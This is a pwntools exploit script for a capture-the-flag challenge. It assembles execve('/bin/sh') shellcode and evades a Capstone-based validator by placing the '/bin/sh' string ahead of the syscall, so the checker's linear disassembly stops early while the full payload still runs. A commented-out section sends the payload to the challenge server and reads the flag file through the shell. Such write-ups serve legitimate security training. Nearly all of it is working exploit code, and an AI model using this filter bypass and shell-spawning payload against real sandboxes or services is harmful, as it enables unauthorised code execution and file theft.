#!/usr/bin/env python3
from pwn import *

context.update(arch='amd64', os='linux')

shell = """
nop;nop;nop;
nop;
xor rsi, rsi;
xor rdx, rdx;
mov rax, 59;
mov rdi, r11; #r11 contains the base addr of the page
add rdi, 0x21;
mov rbx, r11;
add rbx, 0x2a;
jmp rbx;
"""


print("\n---  Assembly  ---")
print(shell)
print("---------------------------------")

'''
Vuln:
Capstone disassembles the code linearly, truncating the disassembly at the first 
bytes that are invalid as an instruction. As a result, by placing /bin/sh and then 
the syscall, the checker stops at the first invalid bytes and truncates everything 
during its checking loop. 
The problem is that all of the non‑truncated code still gets executed, 
rather than only the valid operations.
'''
shellcode_bytes = flat([
	asm(shell),
	b'/bin/sh\x00\x00',
	asm('syscall')
	])

shellcode_hex = shellcode_bytes.hex()
print(shellcode_hex)

# the server is offline so try the printed hex on
# the local chal.py

'''
io = remote('play.h7tex.com', 56179)
io.sendlineafter(b':\n', shellcode_hex.encode())
io.sendline(b"cat ../flag.txt")
data = io.recvregex(rb'H7CTF\{.*\}', capture=True)
flag = data.group(0).decode()
success('Flag: ' + flag)
write('flag.txt', flag)
io.close()'''